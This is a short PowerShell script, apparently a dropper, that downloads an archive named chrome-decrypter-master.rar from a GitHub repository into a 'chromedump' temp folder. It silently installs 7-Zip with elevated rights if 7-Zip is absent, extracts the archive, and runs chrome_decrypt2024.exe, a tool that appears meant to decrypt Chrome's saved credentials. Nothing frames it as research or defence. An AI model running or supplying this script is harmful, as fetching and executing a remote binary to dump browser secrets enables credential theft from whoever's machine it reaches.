$Link = "https://github.com/sabinfotograf/chrome_decrypt2024/raw/main/chrome-decrypter-master.rar"
$File = Join-Path -Path "$Env:TMP\chromedump" -ChildPath "chrome-decrypter-master.rar"
$Folder = Split-path $file -Parent; if(test-path $folder){rmdir $Folder -Recurse -Force | Out-Null}
mkdir $Folder

Write-host "`t- Downloading"
    Set-Location $folder
    Invoke-RestMethod -Uri $Link -OutFile $File 

Write-host "`t- Extracting"
    if((!(test-path "C:\Program Files (x86)\7-Zip\")) -and (!(test-path "C:\Program Files\7-Zip"))){ 
        $dlurl = 'https://7-zip.org/' + (Invoke-WebRequest -UseBasicParsing -Uri 'https://7-zip.org/' | Select-Object -ExpandProperty Links | Where-Object {($_.outerHTML -match 'Download')-and ($_.href -like "a/*") -and ($_.href -like "*-x64.exe")} | Select-Object -First 1 | Select-Object -ExpandProperty href)
        $installerPath = Join-Path $env:TEMP (Split-Path $dlurl -Leaf)
        Invoke-WebRequest $dlurl -OutFile $installerPath
        Start-Process -FilePath $installerPath -Args "/S" -Verb RunAs -Wait
        Remove-Item $installerPath}
    7z e $File -spf; Start-Sleep -S 5

Write-host "`t- Running.."
    CLS
    &.\chrome_decrypt2024.exe

write-host "Credits to: SabinFotograf"